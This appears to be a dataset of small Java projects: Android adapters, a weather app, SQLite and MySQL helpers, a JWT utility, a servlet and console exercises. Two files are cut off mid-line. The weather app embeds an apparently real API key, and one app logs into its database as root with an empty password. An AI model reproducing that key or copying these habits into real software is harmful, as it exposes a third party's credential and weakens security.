    "package com.example.pmd_se_b.CArdViewExample;\n\nimport android.content.Context;\nimport android.media.Image;\nimport android.view.LayoutInflater;\nimport android.view.View;\nimport android.view.ViewGroup;\nimport android.widget.ImageView;\nimport android.widget.TextView;\n\nimport androidx.annotation.NonNull;\nimport androidx.recyclerview.widget.RecyclerView;\n\nimport com.bumptech.glide.Glide;\nimport com.example.pmd_se_b.R;\n\nimport org.w3c.dom.Text;\n\nimport java.util.List;\n\npublic class AdapterCardView extends RecyclerView.Adapter<AdapterCardView.MyCardViewHolder>{\n    public Context context;\n    List<My_Model> list;\n\n    public AdapterCardView(Context context, List<My_Model> list) {\n        this.context = context;\n        this.list = list;\n    }\n\n    @NonNull\n    @Override\n    public MyCardViewHolder onCreateViewHolder(@NonNull ViewGroup parent, int viewType) {\n    View view = LayoutInflater.from(parent.getContext())\n            .inflate(R.layout.my_card,parent,false);\n    return new MyCardViewHolder(view);\n    }\n\n    @Override\n    public void onBindViewHolder(@NonNull MyCardViewHolder holder, int position) {\n        My_Model myModel = list.get(position);\n        holder.title.setText(myModel.getName());\n        holder.count.setText(String.valueOf(myModel.getTotal_dowloads()));\n\n        Glide.with(context).load(myModel.getThumbnails()).into(holder.imageView);\n    }\n\n    @Override\n    public int getItemCount() {\n        return list.size();\n    }\n\n    public class MyCardViewHolder extends RecyclerView.ViewHolder {\n\n        TextView title, count;\n        ImageView imageView;\n\n        public MyCardViewHolder(@NonNull View itemView) {\n            super(itemView);\n            imageView = itemView.findViewById(R.id.imgcardview);\n            title = itemView.findViewById(R.id.txtcard1);\n            count = itemView.findViewById(R.id.textView9);\n\n        }\n    }\n}\n",
    "package ajitsingh.com.expensemanager.database;\n\nimport android.content.ContentValues;\nimport android.content.Context;\nimport android.database.Cursor;\nimport android.database.sqlite.SQLiteDatabase;\nimport android.database.sqlite.SQLiteOpenHelper;\n\nimport java.util.ArrayList;\nimport java.util.List;\n\nimport ajitsingh.com.expensemanager.model.Expense;\nimport ajitsingh.com.expensemanager.model.ExpenseType;\nimport ajitsingh.com.expensemanager.table.ExpenseTable;\nimport ajitsingh.com.expensemanager.table.ExpenseTypeTable;\nimport ajitsingh.com.expensemanager.utils.DateUtil;\n\nimport static ajitsingh.com.expensemanager.utils.DateUtil.getCurrentDate;\nimport static ajitsingh.com.expensemanager.utils.DateUtil.getCurrentWeeksDates;\nimport static java.lang.Integer.parseInt;\nimport static java.lang.Long.parseLong;\n\npublic class ExpenseDatabaseHelper extends SQLiteOpenHelper {\n  public static final String EXPENSE_DB = \"expense\";\n\n  public ExpenseDatabaseHelper(Context context) {\n    super(context, EXPENSE_DB, null, 1);\n  }\n\n  @Override\n  public void onCreate(SQLiteDatabase sqLiteDatabase) {\n    sqLiteDatabase.execSQL(ExpenseTable.CREATE_TABLE_QUERY);\n    sqLiteDatabase.execSQL(ExpenseTypeTable.CREATE_TABLE_QUERY);\n    seedExpenseTypes(sqLiteDatabase);\n  }\n\n  @Override\n  public void onUpgrade(SQLiteDatabase sqLiteDatabase, int oldVersion, int newVersion) {\n\n  }\n\n  public List<String> getExpenseTypes() {\n    ArrayList<String> expenseTypes = new ArrayList<>();\n\n    SQLiteDatabase database = this.getWritableDatabase();\n    Cursor cursor = database.rawQuery(ExpenseTypeTable.SELECT_ALL, null);\n\n    if(isCursorPopulated(cursor)){\n      do {\n        String type = cursor.getString(cursor.getColumnIndex(ExpenseTypeTable.TYPE));\n        expenseTypes.add(type);\n      } while(cursor.moveToNext());\n    }\n\n    return expenseTypes;\n  }\n\n  public void deleteAll() {\n    SQLiteDatabase database = this.getWritableDatabase();\n    database.delete(ExpenseTypeTable.TABLE_NAME, \"\", new String[]{});\n    database.delete(ExpenseTable.TABLE_NAME, \"\", new String[]{});\n    database.close();\n  }\n\n  public void addExpense(Expense expense) {\n    SQLiteDatabase database = this.getWritableDatabase();\n    ContentValues values = new ContentValues();\n    values.put(ExpenseTable.AMOUNT, expense.getAmount());\n    values.put(ExpenseTable.TYPE, expense.getType());\n    values.put(ExpenseTable.DATE, expense.getDate());\n\n    database.insert(ExpenseTable.TABLE_NAME, null, values);\n  }\n\n  public List<Expense> getExpenses() {\n    SQLiteDatabase database = this.getWritableDatabase();\n    Cursor cursor = database.rawQuery(ExpenseTable.SELECT_ALL, null);\n\n    return buildExpenses(cursor);\n  }\n\n  public List<Expense> getTodaysExpenses() {\n    SQLiteDatabase database = this.getWritableDatabase();\n    Cursor cursor = database.rawQuery(ExpenseTable.getExpensesForDate(getCurrentDate()), null);\n\n    return buildExpenses(cursor);\n  }\n\n  public List<Expense> getCurrentWeeksExpenses() {\n    SQLiteDatabase database = this.getWritableDatabase();\n    Cursor cursor = database.rawQuery(ExpenseTable.getConsolidatedExpensesForDates(getCurrentWeeksDates()), null);\n    return buildExpenses(cursor);\n  }\n\n  public List<Expense> getExpensesGroupByCategory() {\n    SQLiteDatabase database = this.getWritableDatabase();\n    Cursor cursor = database.rawQuery(ExpenseTable.SELECT_ALL_GROUP_BY_CATEGORY, null);\n    return buildExpenses(cursor);\n  }\n\n  public List<Expense> getExpensesForCurrentMonthGroupByCategory() {\n    SQLiteDatabase database = this.getWritableDatabase();\n    Cursor cursor = database.rawQuery(ExpenseTable.getExpenseForCurrentMonth(DateUtil.currentMonthOfYear()), null);\n    return buildExpenses(cursor);\n  }\n\n  public void addExpenseType(ExpenseType type) {\n    SQLiteDatabase database = this.getWritableDatabase();\n    ContentValues values = new ContentValues();\n    values.put(ExpenseTable.TYPE, type.getType());\n\n    database.insert(ExpenseTypeTable.TABLE_NAME, null, values);\n  }\n\n  public void truncate(String tableName) {\n    SQLiteDatabase database = this.getWritableDatabase();\n    database.execSQL(\"delete from \" + tableName);\n  }\n\n  private List<Expense> buildExpenses(Cursor cursor) {\n    List<Expense> expenses = new ArrayList<>();\n    if(isCursorPopulated(cursor)){\n      do {\n        String type = cursor.getString(cursor.getColumnIndex(ExpenseTable.TYPE));\n        String amount = cursor.getString(cursor.getColumnIndex(ExpenseTable.AMOUNT));\n        String date = cursor.getString(cursor.getColumnIndex(ExpenseTable.DATE));\n        String id = cursor.getString(cursor.getColumnIndex(ExpenseTable._ID));\n\n        Expense expense = id == null ? new Expense(parseLong(amount), type, date) : new Expense(parseInt(id), parseLong(amount), type, date);\n        expenses.add(expense);\n      } while(cursor.moveToNext());\n    }\n\n    return expenses;\n  }\n\n  private boolean isCursorPopulated(Cursor cursor) {\n    return cursor != null && cursor.moveToFirst();\n  }\n\n  private void seedExpenseTypes(SQLiteDat",
    "/*\n * Click nbfs://nbhost/SystemFileSystem/Templates/Licenses/license-default.txt to change this license\n * Click nbfs://nbhost/SystemFileSystem/Templates/GUIForms/JFrame.java to edit this template\n */\npackage perpustakaan;\nimport java.sql.Connection;\nimport java.sql.DriverManager;\nimport java.sql.ResultSet;\nimport java.sql.PreparedStatement;\nimport javax.swing.*;\nimport javax.swing.table.DefaultTableModel;\nimport java.awt.*;\nimport java.sql.*;\nimport java.awt.event.MouseAdapter;\nimport java.awt.event.MouseEvent;\nimport java.io.File;\nimport javax.swing.filechooser.FileNameExtensionFilter;\n/**\n *\n * @author USER\n */\npublic class TabelBuku extends javax.swing.JFrame {\n\n    Connection conn;\n    PreparedStatement pst;\n    ResultSet rs;\n    /**\n     * Creates new form TabelBuku\n     */\n    public TabelBuku() {\n        initComponents();\n        conn = connectDB();\n         fetch();\n         IdField.setEnabled(false);\n         TabelBuku.addMouseListener(new MouseAdapter() {\n            public void mouseClicked(MouseEvent e) {\n                int row = TabelBuku.getSelectedRow();\n                if (row != -1) {\n                    String id = TabelBuku.getModel().getValueAt(row, 0).toString();\n                    showDataInEditForm(id);\n                }\n            }\n        });\n    }\n    public Connection connectDB() {\n        try {\n//            Class.forName(\"com.mysql.jdbc.Driver\");\n            Connection conn = DriverManager.getConnection(\"jdbc:mysql://localhost:3306/db_perpus\", \"root\", \"\");\n            return conn;\n        } catch (Exception e) {\n            JOptionPane.showMessageDialog(null, e);\n            return null;\n        }\n    }\n     public void fetch() {\n        try {\n            String query = \"SELECT * FROM data_buku\";\n            pst = conn.prepareStatement(query);\n            rs = pst.executeQuery();\n            \n            DefaultTableModel model = (DefaultTableModel) TabelBuku.getModel();\n            model.setRowCount(0);\n            \n            while(rs.next()) {\n                String[] row = {rs.getString(\"id\"), rs.getString(\"judul\"), rs.getString(\"pengarang\"),rs.getString(\"penerbit\"), rs.getString(\"kategori\"), rs.getString(\"image\"), rs.getString(\"status\")};\n                model.addRow(row);\n            }\n        } catch (Exception e) {\n            JOptionPane.showMessageDialog(null, e);\n        }\n    }  \n     private void showDataInEditForm(String id) {\n     try {\n         String query = \"SELECT * FROM data_buku WHERE id=?\";\n         pst = conn.prepareStatement(query);\n         pst.setString(1, id);\n         rs = pst.executeQuery();\n\n         if (rs.next()) {\n             String idbuku = rs.getString(\"id\");\n             String judul = rs.getString(\"judul\");\n             String pengarang = rs.getString(\"pengarang\");\n             String penerbit = rs.getString(\"penerbit\");\n             String kategori = rs.getString(\"kategori\");\n             String image = rs.getString(\"image\"); \n             String status = rs.getString(\"status\"); \n             \n             IdField.setText(idbuku);\n             JudulField.setText(judul);\n             PengarangField.setText(pengarang);\n             PenerbitField.setText(penerbit);\n             KategoriField.setText(kategori);\n             ImgdirField.setText(image);\n             ImgdirField.setPreferredSize(new Dimension(100, ImgdirField.getPreferredSize().height));\n             StatusField.setSelectedItem(status);\n             ImageField.setIcon(new ImageIcon(image));\n             ImageIcon imageIcon = new ImageIcon(image);\n            Image images= imageIcon.getImage(); \n            Image scaledImage = images.getScaledInstance(ImageField.getWidth(), ImageField.getHeight(), Image.SCALE_SMOOTH); \n            ImageIcon scaledImageIcon = new ImageIcon(scaledImage); \n\n            ImageField.setIcon(scaledImageIcon);\n         }\n     } catch (SQLException e) {\n         JOptionPane.showMessageDialog(null, e);\n     }\n }\n     private void search() {\n        try {\n            String keyword = SearchField.getText().trim(); \n            \n            String query = \"SELECT * FROM data_buku WHERE judul LIKE ?\";\n            pst = conn.prepareStatement(query);\n            pst.setString(1, \"%\" + keyword + \"%\"); \n            \n            rs = pst.executeQuery();\n            \n            DefaultTableModel model = new DefaultTableModel();\n            TabelBuku.setModel(model);\n            \n            ResultSetMetaData metaData = rs.getMetaData();\n            int columnCount = metaData.getColumnCount();\n            for (int i = 1; i <= columnCount; i++) {\n                model.addColumn(metaData.getColumnName(i));\n            }\n            \n            while (rs.next()) {\n                Object[] row = new Object[columnCount];\n                for (int i = 1; i <= columnCount; i++) {\n                    row[i - 1] = rs.getObject(i);\n                }\n                model.addRow(row);\n            }\n        } catch (SQLException ex) {\n            JOptionPane.showMessageDia",
    "\npublic class MyMergeSort {\n\t\n\tpublic static void myMergeSort(int[]arr) {\n\t\tif (arr.length<128){\n\t\t\tinsertionSort(arr, 0, arr.length-1);\t\t\t\n\t\t}else { // \uc774\ubbf8 \ubc30\uc5f4 \uae38\uc774\uac00 \uc77c\uc815 \uc774\ud558\uba74 insertion sort\ub85c \ubc14\uafd4\uc11c \ub4e4\uc5b4\uac00\ub2c8\uae4c \ubc30\uc5f4 \uae38\uc774>0 \uc744 \ub530\ub85c \uccb4\ud06c\ud560 \ud544\uc694 \uc5c6\uc9c0 \uc54a\uc744\uae4c...\n\t\t\tint medianIdx = arr.length / 2;\n\t\t\tint[] leftArr = new int[medianIdx];\n\t\t\tint[] rightArr = new int[arr.length - medianIdx];\n\t\t\t\n\t\t\tfor (int i=0; i<arr.length; i++) {\n\t\t\t\tif(i<medianIdx) {\n\t\t\t\t\tleftArr[i] = arr[i];\n\t\t\t\t}else{\n\t\t\t\t\trightArr[i-medianIdx] = arr[i];\n\t\t\t\t}\n\t\t\t}\n\t\t\tmyMergeSort(leftArr);\n\t\t\tmyMergeSort(rightArr);\n\t\t\t\n\t\t\tmyMerge(arr, leftArr,rightArr);\n\t\t}\n\t}\n\t\n\t\n\tpublic static void myMerge(int[]arr,int[]left, int[]right) {\n\t\tint i=0, j=0, k=0;\n\t\tfor (i = 0; i < left.length && j < right.length;) {\n\t\t\tif (left[i]<right[j]) {\n\t\t\t\tarr[k++] = left[i++];\n\t\t\t}else {\n\t\t\t\tarr[k++] = right[j++];\n\t\t\t}\n\t\t}\n\t\tfor (;i<left.length; i++) {\n\t\t\tarr[k++] = left[i];\n\t\t}\n\t\tfor (;j<right.length; j++) {\n\t\t\tarr[k++] = right[j];\n\t\t}\n\t}\n\t\n\t\n\tpublic static void insertionSort(int[]arr, int low, int high) {\n\t\tfor(int i=low+1; i<=high; i++) {\n\t\t\tint key = arr[i]; // i\ubc88\uc9f8\uc758 \uac12\uc744 \ucd5c\uc885\uc801\uc73c\ub85c \uc704\uce58\ud560 \uacf3\uc744 \uacb0\uc815\ud558\uae30 \uc804\uae4c\uc9c0 \ubcf4\uad00\n\t\t\tint j;\n\t\t\tfor(j = i-1; j>=low && arr[j]>key; j--) { // j\uac00 low\uc640 \uac19\uac70\ub098 \ub354\ud074\ub54c\uae4c\uc9c0, arr[j]\uac00 arr[i]\uc758 \ubcf4\uad00\ub41c \uac12\ubcf4\ub2e4 \ud06c\ub2e4\uba74\n\t\t\t\tarr[j+1] = arr[j]; //\n\t\t\t}arr[j+1] = key;\n\t\t}\n\t}\n\n}\n",
    "import java.time.LocalTime;\n\npublic class TicketManagementSystem {\n\n    public enum ShowDay\n    {\n        MONDAY, TUESDAY, WEDNESDAY, THURSDAY, FRIDAY, SATURDAY, SUNDAY\n    }\n\n    public enum MembershipTier {\n        PLATINUM, GOLD, SILVER, NONE\n    }\n\n    public static void checkMovieEligibility(int age, boolean isStudent) {\n        if (age >= 18 && age <= 120) {\n            System.out.println(\"You are eligible to watch movies.\");\n\n            if (isStudent) {\n                System.out.println(\"As a student, you get a discounted ticket.\");\n            } else {\n                System.out.println(\"You need to purchase a regular ticket.\");\n            }\n        } else if(age >= 0){\n            System.out.println(\"Sorry, you are not eligible to watch our movies.\");\n        }else{\n            throw new IllegalArgumentException(\"Not a valid age\");\n        }\n    }\n\n    public static void reserveTicketForToday(int age, LocalTime showTime) {\n        if(age >= 0 && age <= 120){\n            if (age < 18 && showTime.isAfter(LocalTime.parse(\"20:00\"))) {\n                System.out.println(\"Sorry, ticket reservation is not allowed for minors after 8 PM.\");\n            } else if (age >= 60 && showTime.isAfter(LocalTime.parse(\"22:00\"))) {\n                System.out.println(\"Sorry, ticket reservation is not allowed for seniors after 10 PM.\");\n            } else {\n                System.out.println(\"Ticket reserved successfully.\");\n            }\n        }\n        else {\n            throw new IllegalArgumentException(\"Invalid inputs\");\n        }\n    }\n\n    public static void calculateTicketPrice(double basePrice, ShowDay showDay) {\n        if(basePrice > 0 && showDay != null){\n            if (showDay == ShowDay.MONDAY || showDay == ShowDay.TUESDAY ||\n                    showDay == ShowDay.WEDNESDAY || showDay == ShowDay.THURSDAY) {\n                double discountedPrice = basePrice - (basePrice * 0.10);\n                System.out.println(\"Ticket price (with 10% discount): $\" + discountedPrice);\n            } else {\n                System.out.println(\"Regular ticket price: $\" + basePrice);\n            }\n        }else{\n            throw new IllegalArgumentException(\"Invalid inputs\");\n        }\n    }\n\n    public static void upgradeTicket(MembershipTier membershipTier) {\n        if(membershipTier != null){\n            switch (membershipTier) {\n                case PLATINUM:\n                    System.out.println(\"Congratulations! You qualify for a complimentary upgrade to VIP seating.\");\n                    break;\n                case GOLD:\n                    System.out.println(\"As a gold member, you can upgrade to premium seating at a discounted rate.\");\n                    break;\n                case SILVER:\n                    System.out.println(\"Enjoy a standard upgrade with no additional charge.\");\n                    break;\n                case NONE:\n                    System.out.println(\"Sorry, no upgrade options available for your membership tier.\");\n                    break;\n            }\n        } else{\n            throw new IllegalArgumentException(\"Invalid membership tier: \" + membershipTier);\n        }\n    }\n}\n",
    "package com.insuranceapp.util;\n\nimport java.util.Date;\nimport java.util.HashMap;\nimport java.util.Map;\nimport java.util.function.Function;\n\nimport org.springframework.beans.factory.annotation.Value;\nimport org.springframework.security.core.userdetails.UserDetails;\nimport org.springframework.stereotype.Component;\n\nimport io.jsonwebtoken.Claims;\nimport io.jsonwebtoken.Jwts;\nimport io.jsonwebtoken.SignatureAlgorithm;\n\n@Component\npublic class JwtTokenUtil {\n\t\n\tprivate static final long serialVersionUID = -2550185165626007488L;\n\n\tpublic static final long JWT_TOKEN_VALIDITY = 5 * 60 * 60;\n\n\t@Value(\"${jwt.secret}\")\n\tprivate String secret;\n\n\t// retrieve username from jwt token\n\tpublic String getUsernameFromToken(String token) {\n\t\treturn getClaimFromToken(token, Claims::getSubject);\n\t}\n\n\t// retrieve expiration date from jwt token\n\tpublic Date getExpirationDateFromToken(String token) {\n\t\treturn getClaimFromToken(token, Claims::getExpiration);\n\t}\n\n\tpublic <T> T getClaimFromToken(String token, Function<Claims, T> claimsResolver) {\n\t\tfinal Claims claims = getAllClaimsFromToken(token);\n\t\treturn claimsResolver.apply(claims);\n\t}\n\n\t// for retrieveing any information from token we will need the secret key\n\tprivate Claims getAllClaimsFromToken(String token) {\n\t\treturn Jwts.parser().setSigningKey(secret).parseClaimsJws(token).getBody();\n\t}\n\n\t// check if the token has expired\n\tprivate Boolean isTokenExpired(String token) {\n\t\tfinal Date expiration = getExpirationDateFromToken(token);\n\t\treturn expiration.before(new Date());\n\t}\n\n\t// generate token for user\n\tpublic String generateToken(UserDetails userDetails) {\n\t\tMap<String, Object> claims = new HashMap<>();\n\t\treturn doGenerateToken(claims, userDetails.getUsername());\n\t}\n\n\t// while creating the token -\n\t// 1. Define claims of the token, like Issuer, Expiration, Subject, and the ID\n\t// 2. Sign the JWT using the HS512 algorithm and secret key.\n\t// 3. According to JWS Compact\n\t// Serialization(https://tools.ietf.org/html/draft-ietf-jose-json-web-signature-41#section-3.1)\n\t// compaction of the JWT to a URL-safe string\n\tprivate String doGenerateToken(Map<String, Object> claims, String subject) {\n\n\t\treturn Jwts.builder().setClaims(claims).setSubject(subject).setIssuedAt(new Date(System.currentTimeMillis()))\n\t\t\t\t.setExpiration(new Date(System.currentTimeMillis() + JWT_TOKEN_VALIDITY * 1000))\n\t\t\t\t.signWith(SignatureAlgorithm.HS256, secret).compact();\n\t}\n\n\t// validate token\n\tpublic Boolean validateToken(String token, UserDetails userDetails) {\n\t\tfinal String username = getUsernameFromToken(token);\n\t\treturn (username.equals(userDetails.getUsername()) && !isTokenExpired(token));\n\t}\n\n}\n",
    "import java.text.SimpleDateFormat;\nimport java.util.Date;\nimport java.util.Scanner;\n\npublic class Account {\n\tString customerID;\n\tString customerName;\n\tint balance;\n\tint prevTransaction;\n\tpublic Account(String cname, String cid) {\n\t\tcustomerName = cname;\n\t\tcustomerID=cid;\n\t}\n    \n     \n\t void deposit(int amount) {\n\t\tif (amount != 0 && amount>0) {\n\t\t\tbalance = balance + amount;\n\t\t\tprevTransaction = amount;\n\t\t}\n    }  \n\t \n\t void withdraw(int amount) {\n\t\t\tif (amount != 0 && amount>0) {\n\t\t\t\tbalance = balance - amount;\n\t\t\t\tprevTransaction = -amount;\n\t\t\t}\n\t}\n\t\n\t void getPrevTransaction() {\n\t\t if (prevTransaction>0) {\n\t\t\t System.out.println(\"Deposited \"+prevTransaction);\n\t\t }\n\t\t else if(prevTransaction<0) {\n\t\t\t System.out.println(\"Withdrawn: \"+Math.abs(prevTransaction));\n\t\t }\n\t\t else {\n\t\t\t System.out.println(\"no Transaction occured!\");\n\t\t }\n\t }\n\t \n\t void date() {\n\t\t var today = new Date();\n\t\t SimpleDateFormat SDF = new SimpleDateFormat (\"E yyyy.MM.dd  'at' hh:mm:ss a zzz\");\n\t\t System.out.println(\"Current Date: \" +  SDF.format(today));\n\t }\n\t \n\t void showMenu() {\n\t\t char option = '\\0';\n\t\t Scanner scanner= new Scanner(System.in);\n\t\t \n\t\t System.out.println(\"Welcome \"+customerName+\"!\");\n\t\t System.out.println(\"Your ID is: \"+customerID+\"!\");\n\t\t System.out.println();\n\t\t System.out.println(\"What would you like to do?\");\n\t\t System.out.println();\n\t\t System.out.println(\"A. Check Your Balance\");\n\t\t System.out.println(\"B. Make A Deposit\");\n\t\t System.out.println(\"C. Make A Withdraw\");\n\t\t System.out.println(\"D. View Previous Transaction\");\n\t\t System.out.println(\"E. View The Date of Today\");\n\t\t System.out.println(\"F. Exit\");\n\t\t \n\t\t do {\n\t\t\t System.out.println();\n\t\t\t System.out.println(\"Please Enter An Option: \");\n\t\t\t char option1= scanner.next().charAt(0);\n\t\t\t option = Character.toUpperCase(option1);\n\t\t\t switch (option) {\n\t\t\t case 'A':\n\t\t\t\t System.out.println(\"=================\");\n\t\t\t\t System.out.println(\"Balance= \"+balance+\"$\");\n\t\t\t\t System.out.println(\"=================\");\n\t\t\t\t break;\n\t\t\t case 'B':\n\t\t\t\t System.out.println(\"Enter An Amount To Deposit: \");\n\t\t\t\t int amount= scanner.nextInt();\n\t\t\t\t deposit(amount);\n\t\t\t\t break;\n\t\t\t case 'C':\n\t\t\t\t System.out.println(\"Enter An Amount To Withdraw: \");\n\t\t\t\t int amount2= scanner.nextInt();\n\t\t\t\t withdraw(amount2);\n\t\t\t\t break;\n\t\t\t case 'D':\n\t\t\t\t System.out.println(\"=================\");\n\t\t\t\t getPrevTransaction();\n\t\t\t\t System.out.println(\"=================\");\n\t\t\t\t break;\n\t\t\t case 'E':\n\t\t\t\t System.out.println(\"=================\");\n\t\t\t\t date();\n\t\t\t\t System.out.println(\"=================\");\n\t\t\t\t break;\n\t\t\t case 'F':\n\t\t\t\t System.out.println(\"=================\");\n\t\t\t\t break;\n\t\t\t\t default:\n\t\t\t\t\t System.out.println(\"Error: Invalid Option. Please Enter A,B,C,D,E or F\");\n\t\t\t\t\t break;\n\t\t\t }\n\t\t\t \n\t\t }while(option != 'F');\n\t\t System.out.println(\"Thank You For Using Our ATM!\");\n\t }\n}\n",
    "package com.example.weatherapp;\n\nimport android.os.AsyncTask;\nimport android.os.Bundle;\nimport android.widget.Button;\nimport android.widget.EditText;\nimport android.widget.TextView;\nimport android.widget.Toast;\n\nimport androidx.annotation.NonNull;\nimport androidx.annotation.Nullable;\nimport androidx.appcompat.app.AppCompatActivity;\n\nimport org.json.JSONArray;\nimport org.json.JSONException;\nimport org.json.JSONObject;\n\nimport java.io.BufferedReader;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class MainActivity extends AppCompatActivity {\n\n    public static final String KEY = \"fae0f637bb0b053d7a4fa65599a9a71b\";\n    public static final String WEATHER_URL = \"https://api.openweathermap.org/data/2.5/weather?lat=%f&lon=%f&units=metric&lang=ru&appid=%s\";\n    public static final String GET_COORDINATES_URL = \"https://api.openweathermap.org/geo/1.0/direct?q=%s&limit=1&appid=%s\";\n    private EditText userField;\n    private Button mainBtn;\n    private TextView resultInfo;\n\n    @Override\n    protected void onCreate(@Nullable Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_main);\n\n        userField = findViewById(R.id.user_field);\n        mainBtn = findViewById(R.id.main_btn);\n        resultInfo = findViewById(R.id.result_info);\n\n        mainBtn.setOnClickListener(v -> {\n            if (userField.getText().toString().trim().equals(\"\")) {\n                Toast.makeText(MainActivity.this, R.string.no_user_input, Toast.LENGTH_LONG).show();\n            } else {\n                String city = userField.getText().toString();\n                String url = String.format(GET_COORDINATES_URL, city, KEY);\n\n                new GetURLData().execute(url);\n            }\n        });\n    }\n\n    private class GetURLData extends AsyncTask<String, String, String> {\n\n        protected void onPreExecute() {\n            super.onPreExecute();\n            resultInfo.setText(R.string.after_btn_click);\n        }\n\n        @Override\n        protected String doInBackground(String... strings) {\n            String urlString = strings[0];\n            String result = openUrl(urlString);\n            double lat;\n            double lon;\n            try {\n                JSONArray json = new JSONArray(result);\n                lat = json.getJSONObject(0).getDouble(\"lat\");\n                lon = json.getJSONObject(0).getDouble(\"lon\");\n            } catch (JSONException e) {\n                throw new RuntimeException(e);\n            }\n            String weatherUrl = String.format(WEATHER_URL, lat, lon, KEY);\n            return openUrl(weatherUrl);\n        }\n\n        @NonNull\n        private String openUrl(String urlString) {\n            URL url;\n            HttpURLConnection connection;\n            try {\n                url = new URL(urlString);\n                connection = (HttpURLConnection) url.openConnection();\n            } catch (Exception e) {\n                throw new RuntimeException(e);\n            }\n            try (AutoCloseable c = connection::disconnect;\n                 InputStream inputStream = connection.getInputStream();\n                 BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream))) {\n                connection.connect();\n                StringBuilder stringBuilder = new StringBuilder();\n                String line;\n                while ((line = reader.readLine()) != null) {\n                    stringBuilder.append(line).append(\"\\n\");\n                }\n                return stringBuilder.toString();\n            } catch (Exception e) {\n                throw new RuntimeException(e);\n            }\n        }\n\n        @Override\n        protected void onPostExecute(String result) {\n            super.onPostExecute(result);\n            double temp;\n            String description;\n            double windSpeed;\n            try {\n                JSONObject jsonObject = new JSONObject(result);\n                temp = jsonObject.getJSONObject(\"main\").getDouble(\"temp\");\n                description = jsonObject.getJSONArray(\"weather\").getJSONObject(0).getString(\"description\");\n                windSpeed = jsonObject.getJSONObject(\"wind\").getDouble(\"speed\");\n\n            } catch (JSONException e) {\n                throw new RuntimeException(e);\n            }\n            String weatherResult = String.format(\"%s\\n%s%4.0f\\n%s%4.0f\", description, \"\u0422\u0435\u043c\u043f\u0435\u0440\u0430\u0442\u0443\u0440\u0430: \", temp, \"\u0421\u043a\u043e\u0440\u043e\u0441\u0442\u044c \u0432\u0435\u0442\u0440\u0430: \", windSpeed);\n            resultInfo.setText(weatherResult);\n        }\n    }\n}\n",
    "package com.jsp.Servlet.School.View;\n\nimport java.io.IOException;\nimport java.io.PrintWriter;\n\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\nimport com.jsp.Servlet.School.Controller.Controller;\n\n@WebServlet(value = \"/AddStudent\")\npublic class AddStudent extends HttpServlet{\n\t@Override\n\tprotected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n\t\tString name = req.getParameter(\"name\");\n\t\tString age = req.getParameter(\"age\");\n\t\tString gender = req.getParameter(\"gender\");\n\t\tString gmail = req.getParameter(\"mail\");\n\t\tString contact = req.getParameter(\"contact\");\n\t\tString address = req.getParameter(\"add\");\n\t\tString username = req.getParameter(\"user\");\n\t\tString password = req.getParameter(\"pass\");\n\t\t\n\t\t\n\t\tPrintWriter printWriter = resp.getWriter();\n\t\tController controller = new Controller();\n\t\t\n\t\tif (controller.add_student(name,age,gender,gmail,contact,address,username,password)) {\n\t\t\t\n\t\t\tprintWriter.print(\"<!DOCTYPE html>\\r\\n\"\n\t\t\t\t\t+ \"<html>\\r\\n\"\n\t\t\t\t\t+ \"    <head>\\r\\n\"\n\t\t\t\t\t+ \"        <title>Register-login</title>\\r\\n\"\n\t\t\t\t\t+ \"        <link rel=\\\"stylesheet\\\" href=\\\"https://maxcdn.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css\\\">    \\r\\n\"\n\t\t\t\t\t+ \"        <link rel=\\\"stylesheet\\\" href=\\\"https://use.fontawesome.com/releases/v5.7.0/css/all.css\\\">\\r\\n\"\n\t\t\t\t\t+ \"    \\r\\n\"\n\t\t\t\t\t+ \"        <script src=\\\"https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js\\\"></script>\\r\\n\"\n\t\t\t\t\t+ \"        <script src=\\\"https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js\\\"></script>\\r\\n\"\n\t\t\t\t\t+ \"        <script src=\\\"https://maxcdn.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js\\\"></script>\\r\\n\"\n\t\t\t\t\t+ \"        <link rel=\\\"stylesheet\\\" href=\\\"https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css\\\">\\r\\n\"\n\t\t\t\t\t+ \"\\r\\n\"\n\t\t\t\t\t+ \"    </head>\\r\\n\"\n\t\t\t\t\t+ \"    <body>\\r\\n\"\n\t\t\t\t\t+ \"        <div class=\\\"container\\\">\\r\\n\"\n\t\t\t\t\t+ \"          <div class=\\\"row\\\">\\r\\n\"\n\t\t\t\t\t+ \"            <div class=\\\"col-12\\\">\\r\\n\"\n\t\t\t\t\t+ \"              <div class=\\\"d-flex justify-content-center\\\">\\r\\n\"\n\t\t\t\t\t+ \"                <div class=\\\"text-center bg-warning py-4 px-5 h2 font-weight-normal border border-info rounded my-5\\\">\\r\\n\"\n\t\t\t\t\t+ \"                  <i class=\\\"bi bi-download\\\"></i>&nbsp;\\r\\n\"\n\t\t\t\t\t+ \"                  New Student Added\\r\\n\"\n\t\t\t\t\t+ \"                </div>\\r\\n\"\n\t\t\t\t\t+ \"              </div>\\r\\n\"\n\t\t\t\t\t+ \"            </div>\\r\\n\"\n\t\t\t\t\t+ \"          </div>\\r\\n\"\n\t\t\t\t\t+ \"        </div>\\r\\n\"\n\t\t\t\t\t+ \"    </body>\\r\\n\"\n\t\t\t\t\t+ \"</html>\");\n\t\t} else {\n\t\t\tresp.sendRedirect(\"Failed.html\");\n\t\t}\n\t}\n}\n",
